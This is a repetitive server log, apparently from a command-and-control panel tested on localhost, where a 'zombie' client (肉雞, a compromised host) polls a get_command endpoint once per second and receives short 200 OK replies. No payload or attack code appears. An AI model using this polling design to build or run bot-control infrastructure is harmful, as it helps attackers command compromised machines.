2025-06-25 00:17:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:23 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:24 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:25 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:26 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:27 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:28 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:29 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:30 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:31 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:32 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:33 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:35 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:36 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:37 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:38 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:39 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:40 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:41 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:42 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:43 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:44 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:45 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:46 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:47 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:48 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:49 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:50 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:51 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:52 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:53 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:54 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:55 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0020s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:56 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:57 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:58 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:59 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:00 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:01 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:02 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:03 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:04 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:05 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:06 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:07 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:08 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:09 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:10 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:11 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:12 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:13 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:14 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:15 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
